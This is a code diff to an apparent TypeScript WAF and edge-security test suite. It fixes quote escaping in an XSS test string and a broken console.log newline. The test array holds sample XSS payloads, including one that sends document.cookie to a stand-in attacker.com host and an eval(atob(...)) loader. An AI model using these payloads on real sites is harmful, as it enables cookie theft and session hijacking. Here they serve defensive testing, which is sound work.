@@ -77,7 +77,7 @@ export function runEdgeSecurityAndWafTests(): { passed: number; failed: number; 
   try {
     const xssPayloads = [
       '<script>alert("XSS")</script>',
-      '<img src=x onerror="document.cookie='stolen'" />',
+      '<img src=x onerror="document.cookie=\\"stolen\\"" />',
       'javascript:fetch("//attacker.com/"+document.cookie)',
       '<body onload=eval(atob("..."))>',
     ];
@@ -407,8 +407,8 @@ export function runEdgeSecurityAndWafTests(): { passed: number; failed: number; 
 
   console.log('────────────────────────────────────────────────────────────────');
   console.log('📊 RESULTADO SUÍTE 23: ' + passed + '/12 Testes Aprovados (' + (failed === 0 ? '100% SUCESSO' : 'FALHAS DETECTADAS') + ')');
-  console.log('────────────────────────────────────────────────────────────────
-');
+  console.log('────────────────────────────────────────────────────────────────\n');
 
   return { passed, failed, suiteName };
 }
+
